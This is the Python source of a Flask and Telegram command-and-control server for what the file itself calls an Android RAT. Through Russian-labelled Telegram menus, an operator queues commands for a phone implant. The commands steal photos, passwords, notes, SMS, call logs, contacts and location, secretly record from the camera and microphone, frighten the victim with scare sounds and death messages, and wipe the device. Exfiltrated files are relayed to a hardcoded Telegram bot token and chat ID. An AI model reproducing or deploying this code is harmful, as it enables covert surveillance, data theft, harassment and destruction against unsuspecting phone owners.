import os
import sys
import time
import threading
import requests
import json
import base64
from flask import Flask, request, jsonify

# ========== ФИКС ДЛЯ PYTHON 3.14 ==========
# Модуль imghdr удалён, подменяем заглушкой
if 'imghdr' not in sys.modules:
    class FakeImghdr:
        def what(self, data):
            return None
    sys.modules['imghdr'] = FakeImghdr()

# ========== ИМПОРТЫ ==========
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

app = Flask(__name__)

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = '8852080714:AAGC8lOMnrSN-Dtu5WKCm4hksEM9d-nmluk'
CHAT_ID = '7803661441'

bot = Bot(token=BOT_TOKEN)
latest_command = {"cmd": "none", "params": ""}

print("✅ Бот запускается...", flush=True)

# Отправляем тест при старте
try:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {'chat_id': CHAT_ID, 'text': '✅ RAT сервер запущен!'}
    r = requests.post(url, data=data, timeout=5)
    print(f"✅ Тест отправлен, ответ: {r.status_code}", flush=True)
except Exception as e:
    print(f"❌ Ошибка при тесте: {e}", flush=True)

# ========== КНОПКИ TELEGRAM ==========
def main_menu():
    keyboard = [
        [InlineKeyboardButton("📁 ФАЙЛЫ", callback_data='menu_files')],
        [InlineKeyboardButton("📸 ГАЛЕРЕЯ", callback_data='gallery')],
        [InlineKeyboardButton("🔑 ПАРОЛИ", callback_data='passwords')],
        [InlineKeyboardButton("📝 ЗАМЕТКИ", callback_data='notes')],
        [InlineKeyboardButton("🎥 КАМЕРА", callback_data='menu_camera')],
        [InlineKeyboardButton("🎙️ МИКРОФОН", callback_data='menu_mic')],
        [InlineKeyboardButton("🔊 СТРАШНЫЕ ЗВУКИ", callback_data='menu_sounds')],
        [InlineKeyboardButton("😱 УСТРАШЕНИЕ", callback_data='menu_scary')],
        [InlineKeyboardButton("📍 ЛОКАЦИЯ", callback_data='location')],
        [InlineKeyboardButton("💬 СМС", callback_data='sms')],
        [InlineKeyboardButton("📞 ЗВОНКИ", callback_data='calls')],
        [InlineKeyboardButton("👥 КОНТАКТЫ", callback_data='contacts')],
        [InlineKeyboardButton("💀 УНИЧТОЖИТЬ", callback_data='wipe')],
        [InlineKeyboardButton("⚙️ ДРУГИЕ", callback_data='menu_other')]
    ]
    return InlineKeyboardMarkup(keyboard)

def files_menu():
    keyboard = [
        [InlineKeyboardButton("📂 /sdcard", callback_data='files_sdcard')],
        [InlineKeyboardButton("📂 /sdcard/DCIM", callback_data='files_dcim')],
        [InlineKeyboardButton("📂 /sdcard/Download", callback_data='files_download')],
        [InlineKeyboardButton("📂 /sdcard/Documents", callback_data='files_documents')],
        [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

def camera_menu():
    keyboard = [
        [InlineKeyboardButton("📸 ФРОНТАЛЬНАЯ", callback_data='photo_front')],
        [InlineKeyboardButton("📷 ОСНОВНАЯ", callback_data='photo_back')],
        [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

def mic_menu():
    keyboard = [
        [InlineKeyboardButton("🎙️ 5 СЕК", callback_data='audio_5')],
        [InlineKeyboardButton("🎙️ 10 СЕК", callback_data='audio_10')],
        [InlineKeyboardButton("🎙️ 30 СЕК", callback_data='audio_30')],
        [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

def sounds_menu():
    keyboard = [
        [InlineKeyboardButton("🔊 СИРЕНА", callback_data='sound_siren')],
        [InlineKeyboardButton("👻 СТРАШНЫЙ ЗВУК", callback_data='sound_scary')],
        [InlineKeyboardButton("🎵 RICKROLL", callback_data='sound_rickroll')],
        [InlineKeyboardButton("🔔 УВЕДОМЛЕНИЕ", callback_data='sound_notify')],
        [InlineKeyboardButton("📢 ГОЛОСОВОЕ", callback_data='sound_tts')],
        [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

def scary_menu():
    keyboard = [
        [InlineKeyboardButton("👻 СТРАШНАЯ КАРТИНКА", callback_data='scary_image')],
        [InlineKeyboardButton("📺 СТРАШНОЕ ВИДЕО", callback_data='scary_video')],
        [InlineKeyboardButton("🔊 ВЗРЫВ", callback_data='scary_explosion')],
        [InlineKeyboardButton("💀 СООБЩЕНИЕ О СМЕРТИ", callback_data='scary_death')],
        [InlineKeyboardButton("🕷️ ПАУК", callback_data='scary_spider')],
        [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

def other_menu():
    keyboard = [
        [InlineKeyboardButton("🔋 ЗАРЯД", callback_data='battery')],
        [InlineKeyboardButton("🌐 IP", callback_data='ip')],
        [InlineKeyboardButton("📱 МОДЕЛЬ", callback_data='device_info')],
        [InlineKeyboardButton("📡 ОТКРЫТЬ САЙТ", callback_data='open_url')],
        [InlineKeyboardButton("📢 СКАЗАТЬ ТЕКСТ", callback_data='say_text')],
        [InlineKeyboardButton("◀️ НАЗАД", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== ОБРАБОТЧИКИ ==========
def start(update, context):
    update.message.reply_text(
        "🤖 ANDROID RAT АКТИВИРОВАН\n\n"
        "👇 Используйте кнопки",
        reply_markup=main_menu()
    )

def handle_callback(update, context):
    query = update.callback_query
    query.answer()
    data = query.data

    if data == 'back_main':
        query.edit_message_text("🤖 ГЛАВНОЕ МЕНЮ", reply_markup=main_menu())

    elif data == 'menu_files':
        query.edit_message_text("📁 ПАПКИ", reply_markup=files_menu())
    elif data == 'menu_camera':
        query.edit_message_text("📸 КАМЕРА", reply_markup=camera_menu())
    elif data == 'menu_mic':
        query.edit_message_text("🎙️ МИКРОФОН", reply_markup=mic_menu())
    elif data == 'menu_sounds':
        query.edit_message_text("🔊 ЗВУКИ", reply_markup=sounds_menu())
    elif data == 'menu_scary':
        query.edit_message_text("👻 СТРАШНОЕ", reply_markup=scary_menu())
    elif data == 'menu_other':
        query.edit_message_text("⚙️ ДРУГИЕ", reply_markup=other_menu())

    # Файлы
    elif data == 'files_sdcard':
        set_command("files", "/sdcard")
        query.edit_message_text("✅ ОТПРАВЛЕНО", reply_markup=main_menu())
    elif data == 'files_dcim':
        set_command("files", "/sdcard/DCIM")
        query.edit_message_text("✅ ОТПРАВЛЕНО", reply_markup=main_menu())
    elif data == 'files_download':
        set_command("files", "/sdcard/Download")
        query.edit_message_text("✅ ОТПРАВЛЕНО", reply_markup=main_menu())
    elif data == 'files_documents':
        set_command("files", "/sdcard/Documents")
        query.edit_message_text("✅ ОТПРАВЛЕНО", reply_markup=main_menu())

    # Камера
    elif data == 'photo_front':
        set_command("photo", "front")
        query.edit_message_text("✅ ФОТО ЗАПРОШЕНО", reply_markup=main_menu())
    elif data == 'photo_back':
        set_command("photo", "back")
        query.edit_message_text("✅ ФОТО ЗАПРОШЕНО", reply_markup=main_menu())

    # Микрофон
    elif data == 'audio_5':
        set_command("audio", "5")
        query.edit_message_text("🎙️ ЗАПИСЬ 5 СЕК", reply_markup=main_menu())
    elif data == 'audio_10':
        set_command("audio", "10")
        query.edit_message_text("🎙️ ЗАПИСЬ 10 СЕК", reply_markup=main_menu())
    elif data == 'audio_30':
        set_command("audio", "30")
        query.edit_message_text("🎙️ ЗАПИСЬ 30 СЕК", reply_markup=main_menu())

    # Звуки
    elif data == 'sound_siren':
        set_command("sound", "siren")
        query.edit_message_text("🔊 СИРЕНА", reply_markup=main_menu())
    elif data == 'sound_scary':
        set_command("sound", "scary")
        query.edit_message_text("👻 СТРАШНЫЙ ЗВУК", reply_markup=main_menu())
    elif data == 'sound_rickroll':
        set_command("sound", "rickroll")
        query.edit_message_text("🎵 RICKROLL", reply_markup=main_menu())
    elif data == 'sound_notify':
        set_command("sound", "notify")
        query.edit_message_text("🔔 УВЕДОМЛЕНИЕ", reply_markup=main_menu())
    elif data == 'sound_tts':
        set_command("sound", "tts")
        query.edit_message_text("📢 ГОЛОСОВОЕ", reply_markup=main_menu())

    # Страшное
    elif data == 'scary_image':
        set_command("scary", "image")
        query.edit_message_text("👻 СТРАШНАЯ КАРТИНКА", reply_markup=main_menu())
    elif data == 'scary_video':
        set_command("scary", "video")
        query.edit_message_text("📺 СТРАШНОЕ ВИДЕО", reply_markup=main_menu())
    elif data == 'scary_explosion':
        set_command("scary", "explosion")
        query.edit_message_text("💥 ВЗРЫВ", reply_markup=main_menu())
    elif data == 'scary_death':
        set_command("scary", "death")
        query.edit_message_text("💀 СООБЩЕНИЕ", reply_markup=main_menu())
    elif data == 'scary_spider':
        set_command("scary", "spider")
        query.edit_message_text("🕷️ ПАУК", reply_markup=main_menu())

    # Кража
    elif data == 'gallery':
        set_command("gallery", "")
        query.edit_message_text("📸 ГАЛЕРЕЯ", reply_markup=main_menu())
    elif data == 'passwords':
        set_command("passwords", "")
        query.edit_message_text("🔑 ПАРОЛИ", reply_markup=main_menu())
    elif data == 'notes':
        set_command("notes", "")
        query.edit_message_text("📝 ЗАМЕТКИ", reply_markup=main_menu())
    elif data == 'location':
        set_command("location", "")
        query.edit_message_text("📍 ЛОКАЦИЯ", reply_markup=main_menu())
    elif data == 'sms':
        set_command("sms", "")
        query.edit_message_text("💬 СМС", reply_markup=main_menu())
    elif data == 'calls':
        set_command("calls", "")
        query.edit_message_text("📞 ЗВОНКИ", reply_markup=main_menu())
    elif data == 'contacts':
        set_command("contacts", "")
        query.edit_message_text("👥 КОНТАКТЫ", reply_markup=main_menu())

    # Другие
    elif data == 'battery':
        set_command("battery", "")
        query.edit_message_text("🔋 ЗАРЯД", reply_markup=main_menu())
    elif data == 'ip':
        set_command("ip", "")
        query.edit_message_text("🌐 IP", reply_markup=main_menu())
    elif data == 'device_info':
        set_command("device_info", "")
        query.edit_message_text("📱 ИНФО", reply_markup=main_menu())
    elif data == 'open_url':
        set_command("open_url", "")
        query.edit_message_text("📡 ОТКРЫТЬ САЙТ", reply_markup=main_menu())
    elif data == 'say_text':
        set_command("say_text", "")
        query.edit_message_text("📢 СКАЗАТЬ", reply_markup=main_menu())

    # Уничтожение
    elif data == 'wipe':
        set_command("wipe", "")
        query.edit_message_text("💀 УНИЧТОЖЕНИЕ", reply_markup=main_menu())

def set_command(cmd, params):
    latest_command["cmd"] = cmd
    latest_command["params"] = params

# ========== ФОНОВЫЙ СЛУШАТЕЛЬ ДЛЯ ТЕЛЕГРАМ ==========
def listen():
    last_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {'offset': last_id + 1, 'timeout': 5}
            r = requests.get(url, params=params, timeout=6).json()
            if r.get('ok'):
                for upd in r['result']:
                    last_id = upd['update_id']
                    if 'message' in upd and upd['message']['chat']['id'] == int(CHAT_ID):
                        text = upd['message'].get('text', '')
                        if text == '/start':
                            send_msg(CHAT_ID, "✅ Бот активен! Нажми /menu")
                        elif text == '/menu':
                            send_msg(CHAT_ID, "🤖 ГЛАВНОЕ МЕНЮ", reply_markup=main_menu())
                        else:
                            send_msg(CHAT_ID, f"❌ Неизвестно: {text}")
        except Exception as e:
            print(f"Ошибка listen: {e}", flush=True)
        time.sleep(1)

def send_msg(chat, text, reply_markup=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': chat, 'text': text}
        if reply_markup:
            data['reply_markup'] = json.dumps(reply_markup.to_dict())
        requests.post(url, data=data, timeout=5)
    except:
        pass

threading.Thread(target=listen, daemon=True).start()

# ========== FLASK API ==========
@app.route('/')
def home():
    return "✅ RAT сервер работает!", 200

@app.route('/health')
def health():
    return "OK", 200

@app.route('/get_command', methods=['GET'])
def get_command():
    cmd = latest_command["cmd"]
    params = latest_command["params"]
    if cmd != "none":
        latest_command["cmd"] = "none"
        latest_command["params"] = ""
    return jsonify({"command": cmd, "params": params})

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.get_json()
    if data:
        msg_type = data.get('type', 'data')
        content = data.get('content', '')
        if msg_type in ['file', 'photo', 'audio']:
            filedata = base64.b64decode(content)
            filename = data.get('filename', f'{msg_type}_{int(time.time())}')
            filepath = f"/tmp/{filename}"
            with open(filepath, 'wb') as f:
                f.write(filedata)
            with open(filepath, 'rb') as f:
                if msg_type == 'photo':
                    bot.send_photo(chat_id=CHAT_ID, photo=f)
                elif msg_type == 'audio':
                    bot.send_audio(chat_id=CHAT_ID, audio=f)
                else:
                    bot.send_document(chat_id=CHAT_ID, document=f, filename=filename)
            os.remove(filepath)
        else:
            bot.send_message(chat_id=CHAT_ID, text=f"📱 {msg_type.upper()}:\n{content[:3000]}")
    return "OK", 200

# ========== ЗАПУСК ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
